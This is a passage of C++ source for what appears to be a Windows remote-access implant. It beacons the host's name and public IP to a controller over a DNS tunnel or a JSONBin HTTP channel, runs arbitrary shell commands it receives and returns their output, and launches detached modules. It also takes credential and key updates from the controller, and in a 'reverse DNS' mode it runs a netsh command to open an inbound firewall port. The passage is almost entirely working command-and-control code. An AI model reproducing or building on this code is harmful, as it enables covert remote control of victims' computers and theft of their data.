    return final_buffer.empty() ? "Command executed (no output)" : final_buffer;
}

std::string GetTimestamp() {
    SYSTEMTIME st;
    GetSystemTime(&st);
    char buffer[64];
    sprintf_s(buffer, "%04d-%02d-%02dT%02d:%02d:%02d.%03dZ",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    return std::string(buffer);
}

DWORD DNSModeLoop(SimpleJSON* config);
DWORD JSONBinModeLoop(SimpleJSON* config);
DWORD RunReverseDNSMode(SimpleJSON* config);

DWORD WINAPI MainLoopThread(LPVOID lpParam) {
    SimpleJSON* config = (SimpleJSON*)lpParam;

    while (true) {

        std::string mode = config->Get("mode");


        DebugLog("Main Loop Starting in " + mode + " mode");


        DWORD result;
        if (mode == "dns") {
            result = DNSModeLoop(config);
        }
        else {
            result = JSONBinModeLoop(config);
        }

        if (result == 998) {


            DebugLog("MAIN: Entering reverse DNS mode (controller-requested, non-persistent)");


            DWORD reverseResult = RunReverseDNSMode(config);


            DebugLog("MAIN: Reverse DNS ended (result=" + std::to_string(reverseResult) + ") — resuming normal DNS polling");


            continue;
        }

        if (result == 999) {

            DebugLog("MODE SWITCH DETECTED - Reloading configuration...");


            SimpleJSON modeConfig = LoadDNSConfigFromMode();
            std::string newMode = modeConfig.Get("mode");

            DebugLog("Loaded mode from mode.json: " + newMode);

            if (newMode.empty()) {
                DebugLog("WARNING: mode.json returned empty mode, defaulting to jsonbin");
                newMode = "jsonbin";
            }

            if (newMode == "dns") {

                DebugLog("SWITCHING TO DNS MODE");


                config->Set("mode", "dns");
                config->Set("dns_server_ip", modeConfig.Get("dns_server_ip"));
                config->Set("dns_domain", modeConfig.Get("dns_domain"));
                config->Set("dns_port", modeConfig.Get("dns_port"));
                config->Set("dns_encryption_key", modeConfig.Get("dns_encryption_key"));

                DebugLog("DNS Config loaded:");
                DebugLog("  Server IP: " + config->Get("dns_server_ip"));
                DebugLog("  Domain: " + config->Get("dns_domain"));
                DebugLog("  Port: " + config->Get("dns_port"));

            }
            else {

                DebugLog("SWITCHING TO HTTP MODE");


                bool httpLoaded = false;
                std::string keyDirName = GetKeyDirectoryName();

                if (!keyDirName.empty()) {
                    std::string key = ReconstructKey(keyDirName);
                    SimpleJSON httpConfig;
                    if (LoadEncryptedConfig(httpConfig, key)) {
                        config->Set("mode", "jsonbin");
                        config->Set("BIN_ID", httpConfig.Get("BIN_ID"));
                        config->Set("API_KEY", httpConfig.Get("API_KEY"));
                        config->Set("URL", httpConfig.Get("URL"));
                        httpLoaded = true;
                        DebugLog(" HTTP credentials loaded from encrypted config");
                    }
                }

                if (!httpLoaded) {
                    DebugLog(" Encrypted config failed. Trying config_key.json...");
                    SimpleJSON tempConfig;
                    if (LoadConfigKeyJSON(tempConfig)) {
                        config->Set("mode", "jsonbin");
                        config->Set("BIN_ID", tempConfig.Get("BIN_ID"));
                        config->Set("API_KEY", tempConfig.Get("API_KEY"));
                        config->Set("URL", tempConfig.Get("URL"));

                        std::string fernet = tempConfig.Get("FERNET_KEY");
                        if (!fernet.empty()) {
                            ENCRYPTION_KEY = fernet;
                            CreateKeyDirectory(fernet);
                        }
                        httpLoaded = true;
                        DebugLog(" HTTP credentials recovered from config_key.json");
                    }
                }

                if (!httpLoaded) {
                    DebugLog("CRITICAL: Failed to reload HTTP config");
                    config->Set("mode", "jsonbin");
                }


            }

            Sleep(2000);
            continue;
        }
        else {
            return result;
        }
    }

    return 0;
}

DWORD RunReverseDNSMode(SimpleJSON* config) {

    DebugLog("REVERSE DNS MODE STARTED");
    DebugLog("Agent is the server — waiting for controller to connect");


    SimpleJSON modeConfig = LoadDNSConfigFromMode();
    std::string dns_server_ip = modeConfig.Get("dns_server_ip");
    std::string dns_domain = modeConfig.Get("dns_domain");
    std::string dns_port = modeConfig.Get("dns_port");
    std::string dns_encryption_key = modeConfig.Get("dns_encryption_key");

    if (dns_server_ip.empty() || dns_domain.empty() ||
        dns_port.empty() || dns_encryption_key.empty()) {
        DebugLog("ERROR: DNS credentials missing in mode.json for reverse mode");
        SaveMode("jsonbin");
        Sleep(2000);
        return 999;
    }

    int port = std::stoi(dns_port);

    DebugLog("Reverse DNS Config:");
    DebugLog("  Listening on port: " + dns_port);
    DebugLog("  Domain: " + dns_domain);
    DebugLog("  Encryption key length: " + std::to_string(dns_encryption_key.size()));

    std::string fwCmd = "netsh advfirewall firewall add rule name=\"ReverseDNS_" +
        dns_port + "\" dir=in action=allow protocol=UDP localport=" +
        dns_port + " > nul 2>&1";
    system(fwCmd.c_str());
    DebugLog("Firewall rule added for inbound UDP " + dns_port);

    ReverseDNSServer server(dns_encryption_key, port, dns_domain);

    if (!server.Start()) {
        DebugLog("ERROR: Failed to bind reverse DNS server on port " + dns_port);
        DebugLog("Falling back to JSONBin mode...");
        SaveMode("jsonbin");
        Sleep(2000);
        return 999;
    }

    HANDLE listenThread = CreateThread(NULL, 0,
        [](LPVOID param) -> DWORD {
            reinterpret_cast<ReverseDNSServer*>(param)->ListenLoop();
            return 0;
        },
        &server, 0, NULL);

    DebugLog("Waiting for controller to connect (up to 180s)...");
    DWORD wait_start = GetTickCount();
    while (!server.ControllerConnected()) {
        if (GetTickCount() - wait_start > 180000) {
            DebugLog("ERROR: Controller did not connect within 180s");
            DebugLog("Falling back to JSONBin mode...");
            server.Stop();
            WaitForSingleObject(listenThread, 3000);
            CloseHandle(listenThread);
            SaveMode("jsonbin");
            Sleep(2000);
            return 999;
        }
        Sleep(1000);
    }

    DebugLog("Controller connected. Reverse DNS session active.");

    PollSettings pollSettings = LoadPollSettings();
    int currentPollInterval = pollSettings.poll_duration;
    int sleepDuration = pollSettings.sleep_duration;
    int dns_timeout = pollSettings.dns_timeout;

    DWORD lastCommandTime = GetTickCount();
    DWORD dns_timeout_ms = dns_timeout * 1000;
    DWORD pollSessionStart = GetTickCount();

    while (true) {
        DWORD currentTime = GetTickCount();

        DWORD pollElapsed = (currentTime - pollSessionStart) / 1000;
        if (pollElapsed >= (DWORD)currentPollInterval) {
            DebugLog("REVERSE DNS: Poll duration reached — sleeping " +
                std::to_string(sleepDuration) + "s");
            Sleep(sleepDuration * 1000);
            pollSessionStart = GetTickCount();
            DebugLog("REVERSE DNS: Sleep done, resuming");
        }

        if (server.IsRevertRequested()) {
            DebugLog("REVERSE DNS: Revert signal received — returning to normal DNS polling");
            server.Stop();
            WaitForSingleObject(listenThread, 3000);
            CloseHandle(listenThread);
            return 0;
        }

        std::string result = server.GetResult();
        if (!result.empty()) {
            DebugLog("REVERSE DNS: Got result from controller: " + result.substr(0, 80));
            lastCommandTime = GetTickCount();
        }

        if (GetTickCount() - lastCommandTime > dns_timeout_ms) {
            DebugLog("REVERSE DNS: Timeout — no controller activity for " +
                std::to_string(dns_timeout) + "s");
            DebugLog("REVERSE DNS: Reverting to normal DNS polling...");
            server.Stop();
            WaitForSingleObject(listenThread, 3000);
            CloseHandle(listenThread);
            return 0;
        }

        Sleep(200);
    }

    server.Stop();
    WaitForSingleObject(listenThread, 3000);
    CloseHandle(listenThread);
    return 0;
}

DWORD DNSModeLoop(SimpleJSON* config) {

    DebugLog("DNS MODE LOOP STARTED");


    SimpleJSON modeConfig = LoadDNSConfigFromMode();
    std::string dns_server_ip = modeConfig.Get("dns_server_ip");
    std::string dns_domain = modeConfig.Get("dns_domain");
    std::string dns_port = modeConfig.Get("dns_port");
    std::string dns_encryption_key = modeConfig.Get("dns_encryption_key");

    if (dns_server_ip.empty() || dns_domain.empty() || dns_port.empty() || dns_encryption_key.empty()) {
        DebugLog("ERROR: DNS credentials missing in mode.json");
        DebugLog("Falling back to JSONBin mode...");
        SaveMode("jsonbin");
        Sleep(2000);
        return 999;
    }

    DebugLog("DNS Configuration:");
    DebugLog("  Server IP: " + dns_server_ip);
    DebugLog("  Domain: " + dns_domain);
    DebugLog("  Port: " + dns_port);

    PollSettings pollSettings = LoadPollSettings();
    int currentPollInterval = pollSettings.poll_duration;
    int sleepDuration = pollSettings.sleep_duration;
    int dns_timeout = pollSettings.dns_timeout;
    int dns_max_retries = pollSettings.dns_max_retries;

    DebugLog("DNS Poll Settings:");
    DebugLog("  Poll Interval: " + std::to_string(currentPollInterval) + "s");
    DebugLog("  Sleep Duration: " + std::to_string(sleepDuration) + "s");
    DebugLog("  DNS Timeout: " + std::to_string(dns_timeout) + "s");
    DebugLog("  DNS Max Retries: " + std::to_string(dns_max_retries));

    SimpleJSON dnsConfig;
    dnsConfig.Set("server_ip", dns_server_ip);
    dnsConfig.Set("domain", dns_domain);
    dnsConfig.Set("port", dns_port);
    dnsConfig.Set("encryption_key", dns_encryption_key);

    DNSTunnelClient dns_client;

    int connection_attempts = 0;
    bool connected = false;

    while (connection_attempts < dns_max_retries && !connected) {
        connection_attempts++;
        DebugLog("DNS connection attempt " + std::to_string(connection_attempts) + "/" + std::to_string(dns_max_retries));

        if (dns_client.InitializeDNSMode(dnsConfig.ToString())) {
            connected = true;
            DebugLog(" DNS client initialized successfully");
        }
        else {
            DebugLog(" Connection attempt failed");
            if (connection_attempts < dns_max_retries) {
                Sleep(5000);
            }
        }
    }

    if (!connected) {
        DebugLog("ERROR: Failed to initialize DNS client after " + std::to_string(dns_max_retries) + " attempts");
        DebugLog("Switching to JSONBin mode...");
        SaveMode("jsonbin");
        Sleep(2000);
        return 999;
    }

    DebugLog("Starting DNS polling loop...");

    int pollCounter = 0;
    DWORD lastCommandTime = GetTickCount();
    DWORD dns_timeout_ms = dns_timeout * 1000;
    DWORD pollSessionStart = GetTickCount();

    while (true) {
        pollCounter++;
        DWORD currentTime = GetTickCount();

        DWORD pollElapsed = (currentTime - pollSessionStart) / 1000;
        if (pollElapsed >= (DWORD)currentPollInterval) {

            DebugLog("DNS POLL DURATION REACHED: " + std::to_string(currentPollInterval) + "s");
            DebugLog("Entering sleep mode for: " + std::to_string(sleepDuration) + "s");


            Sleep(sleepDuration * 1000);

            pollSessionStart = GetTickCount();
            DebugLog("Sleep completed. Resuming DNS polling...");
        }

        std::string dns_command = dns_client.RequestCommand();

        if (!dns_command.empty() && dns_command != "no_cmd" && dns_command != "None") {
            lastCommandTime = currentTime;
        }
        else {

            if (currentTime - lastCommandTime > dns_timeout_ms) {

                DebugLog("DNS TIMEOUT: No commands for " + std::to_string(dns_timeout) + " seconds");
                DebugLog("Auto-switching to HTTP mode...");


                SaveMode("jsonbin");
                Sleep(2000);
                return 999;
            }
        }

        if (dns_command == "-mode jsonbin") {
            DebugLog("MODE SWITCH: DNS -> JSONBin");

            bool credsLoaded = false;
            std::string keyDirName = GetKeyDirectoryName();

            if (!keyDirName.empty()) {
                std::string encryptionKey = ReconstructKey(keyDirName);
                SimpleJSON httpConfig;

                if (LoadEncryptedConfig(httpConfig, encryptionKey)) {
                    std::string bin_id = httpConfig.Get("BIN_ID");
                    std::string api_key = httpConfig.Get("API_KEY");
                    std::string url = httpConfig.Get("URL");

                    if (!bin_id.empty() && !api_key.empty() && !url.empty()) {
                        DebugLog(" Valid HTTP credentials found");
                        config->Set("BIN_ID", bin_id);
                        config->Set("API_KEY", api_key);
                        config->Set("URL", url);
                        credsLoaded = true;
                    }
                }
            }

            if (!credsLoaded) {
                DebugLog(" Attempting fallback to config_key.json...");
                SimpleJSON fallbackConfig;
                if (LoadConfigKeyJSON(fallbackConfig)) {
                    std::string bin_id = fallbackConfig.Get("BIN_ID");
                    std::string api_key = fallbackConfig.Get("API_KEY");
                    std::string url = fallbackConfig.Get("URL");
                    std::string fernet = fallbackConfig.Get("FERNET_KEY");

                    if (!bin_id.empty() && !api_key.empty() && !url.empty() && !fernet.empty()) {
                        DebugLog(" Recovered credentials from config_key.json");

                        ENCRYPTION_KEY = fernet;
                        config->Set("BIN_ID", bin_id);
                        config->Set("API_KEY", api_key);
                        config->Set("URL", url);

                        CreateKeyDirectory(fernet);
                        SaveEncryptedConfig(*config, fernet);
                        credsLoaded = true;
                    }
                }
            }

            if (!credsLoaded) {
                DebugLog("CRITICAL ERROR: Could not recover HTTP credentials");
                dns_client.SendResult("ERROR: Switching to JSONBin failed - No credentials found.");
                continue;
            }

            SaveMode("jsonbin");
            DebugLog(" Mode saved to mode.json: jsonbin");

            dns_client.SendResult("Switching to JSONBin mode. Switching...");

            Sleep(2000);
            return 999;
        }

        if (dns_command.find("poll_duration ") == 0) {
            try {
                int new_interval = std::stoi(dns_command.substr(14));
                if (new_interval < 1) new_interval = 1;

                PollSettings settings = LoadPollSettings();
                settings.poll_duration = new_interval;
                SavePollSettings(settings);

                currentPollInterval = new_interval;
                pollSessionStart = GetTickCount();

                std::string resultMsg = " DNS poll duration updated to " + std::to_string(new_interval) + "s";
                DebugLog(resultMsg);
                dns_client.SendResult(resultMsg);
            }
            catch (...) {
                dns_client.SendResult("ERROR: Invalid poll_duration value");
            }
            continue;
        }

        if (dns_command.find("sleep_duration ") == 0) {
            std::string val = dns_command.substr(15);
            if (val == "None" || val == "0") {
                sleepDuration = 0;
                dns_client.SendResult(" DNS sleep duration cleared.");
            }
            else {
                try {
                    int new_sleep = std::stoi(val);
                    if (new_sleep < 0) new_sleep = 0;

                    PollSettings settings = LoadPollSettings();
                    settings.sleep_duration = new_sleep;
                    SavePollSettings(settings);

                    sleepDuration = new_sleep;

                    std::string resultMsg = " DNS sleep duration updated to " + std::to_string(new_sleep) + "s";
                    DebugLog(resultMsg);
                    dns_client.SendResult(resultMsg);
                }
                catch (...) {
                    dns_client.SendResult("ERROR: Invalid sleep_duration value");
                }
            }
            continue;
        }

        if (dns_command.find("dns_timeout ") == 0) {
            try {
                int new_timeout = std::stoi(dns_command.substr(12));
                if (new_timeout < 10) new_timeout = 10;

                PollSettings settings = LoadPollSettings();
                settings.dns_timeout = new_timeout;
                SavePollSettings(settings);

                dns_timeout = new_timeout;
                dns_timeout_ms = dns_timeout * 1000;

                std::string resultMsg = " DNS timeout updated to " + std::to_string(new_timeout) + "s";
                DebugLog(resultMsg);
                dns_client.SendResult(resultMsg);
            }
            catch (...) {
                dns_client.SendResult("ERROR: Invalid dns_timeout value");
            }
            continue;
        }

        if (dns_command.find("cmd--settings") == 0) {
            DebugLog("SETTINGS UPDATE REQUEST");

            size_t jsonStart = dns_command.find("{");
            if (jsonStart != std::string::npos) {
                std::string jsonPart = dns_command.substr(jsonStart);

                std::string unescaped = UnescapeJson(jsonPart);
                DebugLog("Unescaped JSON: " + unescaped);
                jsonPart = unescaped;

                SimpleJSON newSettings;
                newSettings.Parse(jsonPart);

                std::string poll_dur = newSettings.Get("poll_duration");
                std::string sleep_dur = newSettings.Get("sleep_duration");
                std::string dns_to = newSettings.Get("dns_timeout");
                std::string dns_retries = newSettings.Get("dns_max_retries");

                PollSettings settings = LoadPollSettings();

                if (!poll_dur.empty()) {
                    settings.poll_duration = std::stoi(poll_dur);
                    currentPollInterval = settings.poll_duration;
                    pollSessionStart = GetTickCount();
                }
                if (!sleep_dur.empty()) {
                    settings.sleep_duration = std::stoi(sleep_dur);
                    sleepDuration = settings.sleep_duration;
                }
                if (!dns_to.empty()) {
                    settings.dns_timeout = std::stoi(dns_to);
                    dns_timeout = settings.dns_timeout;
                    dns_timeout_ms = dns_timeout * 1000;
                }
                if (!dns_retries.empty()) settings.dns_max_retries = std::stoi(dns_retries);

                DebugLog("Updated settings:");
                DebugLog("  poll_duration: " + std::to_string(settings.poll_duration));
                DebugLog("  sleep_duration: " + std::to_string(settings.sleep_duration));
                DebugLog("  dns_timeout: " + std::to_string(settings.dns_timeout));
                DebugLog("  dns_max_retries: " + std::to_string(settings.dns_max_retries));

                if (SavePollSettings(settings)) {
                    dns_client.SendResult(" Settings updated successfully");
                    DebugLog(" New settings saved");
                }
                else {
                    dns_client.SendResult("ERROR: Failed to save settings");
                }
            }

            continue;
        }

        if (dns_command.find("cmd--update-jsonbin") == 0) {
            DebugLog("JSONBIN CREDENTIAL UPDATE REQUEST");

            size_t jsonStart = dns_command.find("{");
            if (jsonStart != std::string::npos) {
                std::string jsonPart = dns_command.substr(jsonStart);

                std::string unescaped;
                for (size_t i = 0; i < jsonPart.length(); i++) {
                    if (jsonPart[i] == '\\' && i + 1 < jsonPart.length() && jsonPart[i + 1] == '"') {
                        unescaped += '"';
                        i++;
                    }
                    else {
                        unescaped += jsonPart[i];
                    }
                }

                DebugLog("Unescaped JSON: " + unescaped);
                jsonPart = unescaped;

                SimpleJSON newCreds;
                newCreds.Parse(jsonPart);

                std::string new_bin = newCreds.Get("bin_id");
                std::string new_api = newCreds.Get("api_key");
                std::string new_url = newCreds.Get("url");

                DebugLog("Parsed credentials:");
                DebugLog("  bin_id: " + new_bin);
                DebugLog("  api_key length: " + std::to_string(new_api.length()));
                DebugLog("  url: " + new_url);

                if (!new_bin.empty() && !new_api.empty() && !new_url.empty()) {
                    if (UpdateJSONBinConfig(new_bin, new_api, new_url)) {
                        std::string successMsg = " JSONBin credentials updated";
                        DebugLog(successMsg);
                        dns_client.SendResult(successMsg);
                    }
                    else {
                        std::string errorMsg = "ERROR: Failed to update JSONBin config";
                        DebugLog(errorMsg);
                        dns_client.SendResult(errorMsg);
                    }
                }
                else {
                    std::string errorMsg = "ERROR: Missing credentials in update command";
                    DebugLog(errorMsg);
                    DebugLog("  bin_id empty: " + std::string(new_bin.empty() ? "yes" : "no"));
                    DebugLog("  api_key empty: " + std::string(new_api.empty() ? "yes" : "no"));
                    DebugLog("  url empty: " + std::string(new_url.empty() ? "yes" : "no"));
                    dns_client.SendResult(errorMsg);
                }
            }
            else {
                std::string errorMsg = "ERROR: No JSON found in update command";
                DebugLog(errorMsg);
                dns_client.SendResult(errorMsg);
            }

            continue;
        }

        if (dns_command.find("cmd--update-dns") == 0) {
            DebugLog("DNS CREDENTIAL UPDATE REQUEST");

            size_t jsonStart = dns_command.find("{");
            if (jsonStart != std::string::npos) {
                std::string jsonPart = dns_command.substr(jsonStart);

                std::string unescaped;
                for (size_t i = 0; i < jsonPart.length(); i++) {
                    if (jsonPart[i] == '\\' && i + 1 < jsonPart.length() && jsonPart[i + 1] == '"') {
                        unescaped += '"';
                        i++;
                    }
                    else {
                        unescaped += jsonPart[i];
                    }
                }

                DebugLog("Unescaped JSON: " + unescaped);
                jsonPart = unescaped;

                SimpleJSON newDnsCreds;
                newDnsCreds.Parse(jsonPart);

                std::string new_server_ip = newDnsCreds.Get("server_ip");
                std::string new_domain = newDnsCreds.Get("domain");
                std::string new_port = newDnsCreds.Get("port");
                std::string new_key = newDnsCreds.Get("encryption_key");

                DebugLog("Parsed values:");
                DebugLog("  server_ip: " + new_server_ip);
                DebugLog("  domain: " + new_domain);
                DebugLog("  port: " + new_port);
                DebugLog("  encryption_key: " + new_key);

                if (!new_server_ip.empty() && !new_domain.empty() &&
                    !new_port.empty() && !new_key.empty()) {
                    if (UpdateDNSConfig(new_server_ip, new_domain, new_port, new_key)) {
                        dns_client.SendResult(" DNS credentials updated");
                        DebugLog(" DNS config updated");
                    }
                    else {
                        dns_client.SendResult("ERROR: Failed to update DNS config");
                    }
                }
                else {
                    dns_client.SendResult("ERROR: Missing credentials in DNS update command");
                }
            }

            continue;
        }

        if (dns_command.find("cmd--update-creds") == 0) {
            DebugLog("CREDENTIAL MIGRATION INITIATED...");

            size_t jsonStart = dns_command.find("{");
            if (jsonStart != std::string::npos) {
                std::string jsonPart = dns_command.substr(jsonStart);

                if (UpdateConnectionConfig(jsonPart)) {
                    dns_client.SendResult("Credentials updated successfully in DNS mode.");
                    DebugLog(" Credentials updated");
                }
                else {
                    dns_client.SendResult("ERROR: Failed to update credentials");
                    DebugLog("✗ Credential update failed");
                }
            }
            else {
                dns_client.SendResult("ERROR: Invalid credential update format");
            }

            continue;
        }

        if (dns_command.find("cmd--fernet") == 0) {
            std::string newFernetKey = (dns_command.length() > 12) ? dns_command.substr(12) : "";

            size_t start = newFernetKey.find_first_not_of(" \t\n\r");
            size_t end = newFernetKey.find_last_not_of(" \t\n\r");
            if (start != std::string::npos && end != std::string::npos) {
                newFernetKey = newFernetKey.substr(start, end - start + 1);
            }

            DebugLog("Fernet key update requested: " + newFernetKey);

            if (!newFernetKey.empty() && UpdateFernetKey(newFernetKey)) {
                dns_client.SendResult("Fernet key changed and local config re-encrypted.");
                DebugLog(" Fernet key updated successfully");
            }
            else {
                dns_client.SendResult("ERROR: Fernet key change failed.");
                DebugLog("✗ Fernet key update failed");
            }

            continue;
        }

        if (dns_command.find("exec-") == 0) {
            std::string moduleRaw = dns_command.substr(5);

            std::string moduleName = moduleRaw;
            {
                size_t cbPos = moduleRaw.find("|CALLBACK:");
                if (cbPos != std::string::npos)
                    moduleName = moduleRaw.substr(0, cbPos);
            }

            std::string modulePath;
            if (moduleRaw.find("modules\\") == 0 || moduleRaw.find("modules/") == 0) {
                modulePath = moduleRaw;
            }
            else {
                modulePath = "modules\\" + moduleRaw;
            }

            DebugLog("Module execution request: " + moduleName);
            DebugLog("Full module path: " + modulePath);

            if (LaunchModuleDetached(modulePath, moduleName)) {
                std::string successMsg = "Module " + moduleName + " launched. Agent ready.";
                DebugLog(" " + successMsg);
                dns_client.SendResult(successMsg);
            }
            else {
                std::string errorMsg = "ERROR: Failed to launch " + moduleName;
                DebugLog(errorMsg);
                dns_client.SendResult(errorMsg);
            }

            continue;
        }

        if (dns_command.find("stop-") == 0) {
            std::string moduleName = dns_command.substr(5);

            if (StopModule(moduleName)) {
                std::string resultMsg = " Stopped module: " + moduleName;
                DebugLog(resultMsg);
                dns_client.SendResult(resultMsg);
            }
            else {
                std::string resultMsg = "Module not running: " + moduleName;
                DebugLog(resultMsg);
                dns_client.SendResult(resultMsg);
            }

            continue;
        }

        if (dns_command == "-reverse_dns") {
            DebugLog("REVERSE DNS: Received -reverse_dns command from controller");
            dns_client.SendResult(
                "Switching to Reverse DNS mode. "
                "Agent will now act as the server on port " + dns_port
            );
            Sleep(2000);
            return 998;
        }

        if (!dns_command.empty() && dns_command != "None" && dns_command != "no_cmd") {
            DebugLog("DNS Command #" + std::to_string(pollCounter) + ": " + dns_command);

            std::string actualCmd = dns_command;
            if (actualCmd.find("cmd-") == 0) {
                actualCmd = actualCmd.substr(4);
            }

            std::string result = ExecuteCommand(actualCmd);

            if (result.empty()) {
                result = "Command executed (No output)";
            }

            DebugLog("Sending result (" + std::to_string(result.length()) + " bytes)");
            dns_client.SendResult(result);

            lastCommandTime = GetTickCount();
        }

        Sleep(1000);
    }

    return 0;
}

DWORD JSONBinModeLoop(SimpleJSON* config) {
    std::string url = config->Get("URL");
    std::string apiKey = config->Get("API_KEY");


    DebugLog("JSONBIN MODE LOOP STARTED");
    DebugLog("URL: " + url);
    DebugLog("API_KEY: " + apiKey);


    PollSettings pollSettings = LoadPollSettings();
    int currentPollInterval = pollSettings.poll_duration;
    int sleepDuration = pollSettings.sleep_duration;
    int pollDurationLimit = 0;

    DebugLog("Poll Settings:");
    DebugLog("  Poll Duration: " + std::to_string(currentPollInterval) + "s");
    DebugLog("  Sleep Duration: " + std::to_string(sleepDuration) + "s");

    std::string publicIP = GetPublicIP();
    char computerName[MAX_PATH];
    DWORD size = MAX_PATH;
    GetComputerNameA(computerName, &size);
    std::string deviceName = computerName;

    g_device_id = deviceName + "_" + publicIP;
    DebugLog("Device identity set: " + g_device_id);

    const DWORD RETRY_INTERVAL = 10000;
    const DWORD MAX_RETRY_DURATION = 1800000;
    const DWORD SLEEP_AFTER_FAILURE = 1800000;

    bool connectionEstablished = false;
    DWORD retryPhaseStart = GetTickCount();

    while (true) {

        if (!connectionEstablished) {
            DWORD currentTime = GetTickCount();
            DWORD elapsedInRetryPhase = currentTime - retryPhaseStart;

            if (elapsedInRetryPhase >= MAX_RETRY_DURATION) {

                DebugLog("NO CONNECTION AFTER 30 MINUTES");
                DebugLog("Entering 30-minute sleep mode...");


                Sleep(SLEEP_AFTER_FAILURE);


                DebugLog("Sleep completed. Restarting retry cycle...");


                retryPhaseStart = GetTickCount();
                continue;
            }

            SimpleJSON startupData;
            startupData.Set("device_ip", publicIP);
            startupData.Set("device_name", deviceName);
            startupData.Set("device_status", "active");
            startupData.Set("current_dir", g_currentDir);
            startupData.Set("startup_timestamp", GetTimestamp());
            startupData.Set("cmd", "None");
            startupData.Set("mode", "jsonbin");

            std::string payload = startupData.ToString();
            DebugLog("Sending startup data (Retry phase): " + payload);

            std::string response = HttpRequest(url, "PUT", apiKey, payload);

            if (!response.empty()) {
                DebugLog("Startup response received: " + response);
            }
            else {
                DebugLog("No response from server");
            }

            DebugLog("Waiting 10 seconds for commands...");
            DWORD waitStart = GetTickCount();
            bool commandReceived = false;

            while ((GetTickCount() - waitStart) < RETRY_INTERVAL) {
                std::string cmdResponse = HttpRequest(url, "GET", apiKey);

                if (!cmdResponse.empty()) {
                    SimpleJSON data;
                    data.Parse(cmdResponse);

                    {
                        std::string incomingTarget = data.Get("target_id");
                        if (!incomingTarget.empty()) {
                            std::lock_guard<std::mutex> lk(g_target_id_mutex);
                            g_target_id = incomingTarget;
                        }
                    }
                    {
                        std::lock_guard<std::mutex> lk(g_target_id_mutex);
                        bool deviceIdReady = (g_device_id.length() > 1 && g_device_id != "_");
                        if (deviceIdReady && !g_target_id.empty() && g_target_id != g_device_id) {
                            DebugLog("ISOLATION: Not for us (target=" + g_target_id +
                                ", us=" + g_device_id + ") — skipping.");
                            Sleep(1000);
                            continue;
                        }
                    }

                    std::string cmdStr = data.Get("cmd");

                    if (cmdStr != "None" && !cmdStr.empty()) {
                        DebugLog("Command received: " + cmdStr);
                        connectionEstablished = true;
                        commandReceived = true;
                        g_ipSent = true;


                        DebugLog("CONNECTION ESTABLISHED");
                        DebugLog("Entering normal operation mode...");


                        connectionEstablished = true;
                        commandReceived = true;
                        g_ipSent = true;

                        data.Set("cmd", "None");
                        data.Set("cmd_result", "executing...");
                        HttpRequest(url, "PUT", apiKey, data.ToString());

                        std::string actualCmd = cmdStr;
                        if (actualCmd.find("cmd-") == 0) actualCmd = actualCmd.substr(4);

                        DebugLog("Executing (from connection establishment): " + actualCmd);
                        std::string result = ExecuteCommand(actualCmd);

                        data.Set("cmd", "None");
                        data.Set("cmd_result", result);
                        data.Set("result_timestamp", GetTimestamp());
                        data.Set("current_dir", g_currentDir);
                        HttpRequest(url, "PUT", apiKey, data.ToString());

                        DebugLog("Result written to JSONBin");
                        Sleep(3000);
                        break;
                    }
                }

                Sleep(1000);
            }

            if (!commandReceived) {
                DWORD minutesElapsed = elapsedInRetryPhase / 60000;
                DWORD minutesRemaining = (MAX_RETRY_DURATION - elapsedInRetryPhase) / 60000;
                DebugLog("No commands received. Retrying... (" +
                    std::to_string(minutesElapsed) + "/" +
                    std::to_string(MAX_RETRY_DURATION / 60000) + " minutes elapsed, " +
                    std::to_string(minutesRemaining) + " minutes remaining)");
                continue;
            }
        }

    PROCESS_COMMAND:

        DWORD currentTime = GetTickCount();
        DWORD pollSessionStart = GetTickCount();
        DWORD lastCommandTime = GetTickCount();
        DWORD sessionStartTime = GetTickCount();

        if (pollDurationLimit > 0) {
            DWORD elapsed = (currentTime - sessionStartTime) / 1000;
            if (elapsed >= (DWORD)pollDurationLimit) {
                DebugLog("Poll duration limit reached. Terminating agent.");
                ExitProcess(0);
            }
        }

        DWORD pollElapsed = (currentTime - pollSessionStart) / 1000;
        if (pollElapsed >= (DWORD)currentPollInterval) {

            DebugLog("POLL DURATION REACHED: " + std::to_string(currentPollInterval) + "s");
            DebugLog("Entering sleep mode for: " + std::to_string(sleepDuration) + "s");


            Sleep(sleepDuration * 1000);

            pollSessionStart = GetTickCount();
            DebugLog("Sleep completed. Resuming polling...");
        }

        currentTime = GetTickCount();
        DWORD timeSinceLastCommand = (currentTime - lastCommandTime) / 1000;

        if (timeSinceLastCommand >= 3) {
            SimpleJSON heartbeatData;
            heartbeatData.Set("device_ip", publicIP);
            heartbeatData.Set("device_name", deviceName);
            heartbeatData.Set("device_status", "active");
            heartbeatData.Set("current_dir", g_currentDir);
            heartbeatData.Set("startup_timestamp", GetTimestamp());
            heartbeatData.Set("cmd", "None");
            heartbeatData.Set("mode", "jsonbin");

            std::string heartbeatPayload = heartbeatData.ToString();
            DebugLog("Sending device info heartbeat: " + heartbeatPayload);

            std::string heartbeatResponse = HttpRequest(url, "PUT", apiKey, heartbeatPayload);
            DebugLog("Heartbeat response: " + heartbeatResponse);

            lastCommandTime = GetTickCount();
        }

        std::string cmdResponse = HttpRequest(url, "GET", apiKey);

        if (!cmdResponse.empty()) {
            SimpleJSON data;
            data.Parse(cmdResponse);

            {
                std::string incomingTarget = data.Get("target_id");
                if (!incomingTarget.empty()) {
                    std::lock_guard<std::mutex> lk(g_target_id_mutex);
                    g_target_id = incomingTarget;
                }
            }
            {
                std::lock_guard<std::mutex> lk(g_target_id_mutex);
                if (!g_target_id.empty() && g_target_id != g_device_id) {
                    DebugLog("ISOLATION: Not for us (target=" + g_target_id +
                        ", us=" + g_device_id + ") — skipping.");
                    Sleep(1000);
                    continue;
                }
            }

            std::string cmdStr = data.Get("cmd");

            if (cmdStr != "None" && !cmdStr.empty()) {
                lastCommandTime = GetTickCount();

                if (cmdStr.find("cmd--settings") == 0) {
                    DebugLog("SETTINGS UPDATE REQUEST");

                    size_t jsonStart = cmdStr.find("{");
                    if (jsonStart != std::string::npos) {
                        std::string jsonPart = cmdStr.substr(jsonStart);
                        std::string unescaped = UnescapeJson(jsonPart);
                        DebugLog("Unescaped JSON: " + unescaped);
                        jsonPart = unescaped;

                        SimpleJSON newSettings;
                        newSettings.Parse(jsonPart);

                        std::string poll_dur = newSettings.Get("poll_duration");
                        std::string sleep_dur = newSettings.Get("sleep_duration");
                        std::string dns_to = newSettings.Get("dns_timeout");
                        std::string dns_retries = newSettings.Get("dns_max_retries");

                        PollSettings settings = LoadPollSettings();
